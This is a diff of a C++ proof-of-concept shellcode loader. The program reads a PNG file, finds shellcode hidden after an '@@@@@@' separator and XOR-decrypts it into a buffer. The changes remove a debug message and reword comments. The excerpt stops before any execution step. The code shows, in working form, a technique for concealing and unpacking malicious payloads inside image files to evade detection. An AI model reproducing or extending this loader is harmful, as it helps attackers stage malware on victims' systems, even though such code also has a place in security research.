@@ -6,7 +6,7 @@
 
 int main() {
     int i = 0;
-    
+
     //We load the bytes of the image on a vector 
     std::ifstream image("C:\\gaticos\\PoC_load_shellcode.png", std::ios::binary);
 
@@ -20,7 +20,6 @@ int main() {
     for (i = 0; i < bytes.size(); i++) {
         if ((int)bytes[i] == 64) { //If we find a '@', we check if the following bytes match to the separator '@@@@@@' that we used in the python script
             if ((int)bytes[i + 1] == 64 && (int)bytes[i + 2] == 64 && (int)bytes[i + 3] == 64 && (int)bytes[i + 4] == 64 && (int)bytes[i + 5] == 64) {
-                std::cout << "I found the Shellcode!" << std::endl;
                 byte_start = i + 6; //We save the start possition of the shellcode
                 break;
             }
@@ -30,12 +29,11 @@ int main() {
 
     unsigned char result[7000]; //We create a buffer where we will save the decrypted shellcode
     int h = 0;
-    int code_size = bytes.size() - byte_start; //We calculate the size of the shellcode
     for (int v = byte_start; v < bytes.size(); v+=3) { //We iterate the shellcode, with a 3-byte step
-        if (h % 2 == 0) { //If the current byte is a even number possition, we xor it  the value that is shifted by one position from the current byte
+        if (h % 2 == 0) { //If the current byte corresponds to an even number possition of the original shellcode (without encryption), we xor it  the value that is shifted by one position from the current byte
             result[h] = bytes[v] ^ bytes[v+1];
         }
-        else {  //If the current byte is a odd number possition, we xor it with the value that is shifted by two positions from the current byte
+        else {  //If the current byte corresponds to an odd number possition of the original shellcode (without encryption), we xor it with the value that is shifted by two positions from the current byte
             result[h] = bytes[v] ^ bytes[v+2];
         }
         h++;
